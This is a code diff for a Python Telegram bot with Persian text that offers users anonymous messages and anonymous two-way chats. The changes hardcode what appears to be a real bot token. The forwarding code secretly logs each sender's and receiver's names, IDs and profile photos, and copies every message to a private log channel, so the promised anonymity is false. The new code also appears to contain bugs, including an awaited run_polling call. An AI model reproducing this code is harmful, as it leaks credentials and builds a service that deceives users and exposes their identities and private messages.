@@ -7,8 +7,8 @@ from telegram.ext import (
     CallbackQueryHandler, ContextTypes, filters
 )
 
-TOKEN = "YOUR_BOT_TOKEN"
-LOG_CHANNEL_ID = -1002538510971
+TOKEN = "7761910626:AAFT_eRxUjozvapaJxmTHkolMZANBfsI47o"
+LOG_CHANNEL_ID = -1002538510971  # آیدی کانال لاگ
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -16,39 +16,44 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-active_chats = {}  # Format: {uid: {partner_id: {receiver, type, last_active}}}
+# ساختار داده: active_chats = { user_id: { partner_id: {receiver, type, last_active} } }
+active_chats = {}
 chat_history = {}
 
 def get_display_name(user):
-    return f"@{user.username}" if user.username else user.full_name
+    if hasattr(user, "username") and user.username:
+        return f"@{user.username}"
+    elif hasattr(user, "full_name") and user.full_name:
+        return user.full_name
+    else:
+        return "کاربر ناشناس"
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     user_id = update.effective_user.id
 
     if args:
-        target_id = int(args[0])
-        context.user_data["target_id"] = target_id
-
         try:
+            target_id = int(args[0])
+            context.user_data["target_id"] = target_id
             user = await context.bot.get_chat(target_id)
             display_name = get_display_name(user)
         except:
             display_name = "کاربر ناشناس"
 
         await update.message.reply_text(
-            f"\U0001F464 انتخاب کن چیکار می‌خوای بکنی برای {display_name}:",
+            f"👤 انتخاب کن چیکار می‌خوای بکنی برای {display_name}:",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton(f"\u2709\ufe0f ارسال پیام ناشناس به\n{display_name}", callback_data=f"sendto_{target_id}")],
-                [InlineKeyboardButton(f"\U0001F501 چت دو طرفه با\n{display_name}", callback_data=f"duo_{target_id}")],
-                [InlineKeyboardButton("\U0001F3AF دریافت لینک ناشناس من", callback_data="getlink")]
+                [InlineKeyboardButton(f"✉️ ارسال پیام ناشناس به\n{display_name}", callback_data=f"sendto_{target_id}")],
+                [InlineKeyboardButton(f"🔁 چت دو طرفه با\n{display_name}", callback_data=f"duo_{target_id}")],
+                [InlineKeyboardButton("🎯 دریافت لینک ناشناس من", callback_data="getlink")]
             ])
         )
     else:
         await update.message.reply_text(
-            "\U0001F44B خوش اومدی! با این ربات می‌تونی پیام ناشناس دریافت یا ارسال کنی.",
+            "👋 خوش اومدی! با این ربات می‌تونی پیام ناشناس دریافت یا ارسال کنی.",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("\U0001F3AF دریافت لینک ناشناس من", callback_data="getlink")]
+                [InlineKeyboardButton("🎯 دریافت لینک ناشناس من", callback_data="getlink")]
             ])
         )
 
@@ -57,10 +62,12 @@ async def end_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_chats = active_chats.get(user_id, {})
 
     for partner_id in list(user_chats):
-        partner_chat = active_chats.get(partner_id, {})
+        # حذف دوطرفه چت از هر دو طرف
+        partner_chats = active_chats.get(partner_id, {})
         user_chats.pop(partner_id, None)
-        active_chats.get(partner_id, {}).pop(user_id, None)
+        partner_chats.pop(user_id, None)
 
+        # حذف پیام‌های ذخیره شده (اختیاری)
         for uid in [user_id, partner_id]:
             messages = chat_history.pop(uid, [])
             for chat_id, msg_id in messages:
@@ -69,6 +76,7 @@ async def end_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except Exception as e:
                     logger.warning(f"خطا در حذف پیام: {e}")
 
+        # ارسال پیام پایان چت به طرف مقابل (اختیاری)
         try:
             await context.bot.send_message(chat_id=partner_id, text="❌ طرف مقابل چت ناشناس را پایان داد.")
         except:
@@ -144,22 +152,19 @@ async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_chats = active_chats.get(user_id, {})
 
-    duo_targets = [uid for uid, data in user_chats.items()
-                   if data.get("type") == "twoway"
-                   and datetime.now() - data["last_active"] < timedelta(days=3)]
-
+    duo_targets = [uid for uid, data in user_chats.items() if data.get("type") == "twoway"]
     if not duo_targets:
         await update.message.reply_text("❌ چت دوطرفه فعالی نداری.")
         return
 
-    buttons = [[InlineKeyboardButton(str(uid), callback_data=f"select_{uid}")]
-               for uid in duo_targets]
+    buttons = [[InlineKeyboardButton(str(uid), callback_data=f"select_{uid}")] for uid in duo_targets]
     await update.message.reply_text("👥 انتخاب کن با کدوم مخاطب چت می‌کنی:", reply_markup=InlineKeyboardMarkup(buttons))
 
 async def forward_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message
     user_id = message.from_user.id
 
+    # اگر مخاطب خاصی از پنل انتخاب شده
     target_id = context.user_data.get("target_id")
     if target_id:
         try:
@@ -167,7 +172,6 @@ async def forward_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await message.reply_text("✅ پیام برای مخاطب انتخابی ارسال شد.")
         except Exception as e:
             logger.error(f"خطا در ارسال پیام پنل: {e}")
-        context.user_data.pop("target_id", None)
         return
 
     user_chats = active_chats.get(user_id, {})
@@ -194,6 +198,9 @@ async def forward_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
             sender_name = get_display_name(sender)
             receiver_name = get_display_name(receiver_chat)
 
+            sender_photos = await sender.get_profile_photos()
+            receiver_photos = await receiver_chat.get_profile_photos()
+
             log_text = (
                 f"📨 پیام ناشناس\n"
                 f"👤 فرستنده: {sender_name} (ID: {sender.id})\n"
@@ -201,7 +208,6 @@ async def forward_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"🕒 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             )
 
-            sender_photos = await context.bot.get_user_profile_photos(sender.id)
             if sender_photos.total_count > 0:
                 await context.bot.send_photo(
                     chat_id=LOG_CHANNEL_ID,
@@ -211,7 +217,8 @@ async def forward_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_text)
 
-            await message.copy(chat_id=-1002538510971)
+            # ارسال پیام اصلی به کانال لاگ هم بکن
+            await message.copy(chat_id=LOG_CHANNEL_ID)
 
         except Exception as e:
             logger.error(f"خطا در لاگ‌گیری: {e}")
@@ -220,17 +227,19 @@ async def forward_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if chat["type"] == "oneway":
             await message.reply_text("✅ پیام شما ارسال شد.")
-        return
+            return  # فقط یک ارسال برای یک طرف
 
-    await message.reply_text("⛔ چت ناشناس فعالی ندارید.")
-
-if __name__ == '__main__':
+async def main():
     app = ApplicationBuilder().token('7761910626:AAFT_eRxUjozvapaJxmTHkolMZANBfsI47o').build()
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("end", end_chat))
     app.add_handler(CommandHandler("panel", panel))
     app.add_handler(CallbackQueryHandler(handle_buttons))
-    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, forward_any))
+    app.add_handler(MessageHandler(filters.ALL & (~filters.COMMAND), forward_any))
 
-    app.run_polling()
+    await app.run_polling()
+
+if __name__ == "__main__":
+    import asyncio
+    asyncio.run(main())
